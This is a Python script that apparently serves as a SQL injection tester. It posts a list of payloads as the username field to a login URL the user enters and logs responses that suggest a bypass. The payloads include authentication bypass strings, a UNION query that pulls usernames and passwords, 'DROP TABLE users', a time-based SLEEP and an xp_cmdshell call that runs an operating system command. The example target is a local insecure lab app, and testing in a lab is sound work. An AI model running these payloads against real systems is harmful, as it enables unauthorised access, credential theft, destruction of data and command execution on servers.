import requests

# Payloads to test SQL Injection vulnerability
sql_injection_payloads = [
    "' OR '1'='1'; --",
    "' OR '1'='1' /*",
    "' UNION SELECT null, username, password FROM users; --",
    "'; DROP TABLE users; --",
    "1 AND SLEEP(5); --",
    "'; EXEC xp_cmdshell('whoami'); --",
    "' OR 1=1 --",
    "' AND EXISTS (SELECT * FROM users WHERE username='admin') --",
    "testuser' --",  # Added payload to test
]


def check_sql_injection(url, output_file):
    with open(output_file, 'w') as file:
        for payload in sql_injection_payloads:
            # Prepare data for the login form with the SQL injection payload
            data = {
                "username": payload,
                "password": "irrelevant_password"  # We don't care about the password for the injection test
            }

            try:
                response = requests.post(url, data=data)

                # Check for successful login indicators in the response
                if "Login successful" in response.text or "Welcome" in response.text:
                    log_message = f"[+] SQL Injection vulnerability found with payload: {payload}\n"
                    print(log_message.strip())
                    file.write(log_message)
                elif "Invalid credentials" not in response.text:
                    # If the login failed but did not show invalid credentials, it might still be a vulnerability
                    log_message = f"[+] Possible SQL Injection vulnerability with payload: {payload}. Response: {response.text}\n"
                    print(log_message.strip())
                    file.write(log_message)
                else:
                    print(f"[-] No vulnerability found for payload: {payload}")

            except requests.RequestException as e:
                print(f"Error connecting to {url}: {e}")


if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://localhost/insecure_app/login.php): ")
    output_file = "sql_injection_vulnerabilities.txt"
    check_sql_injection(target_url, output_file)
    print(f"Results written to {output_file}")
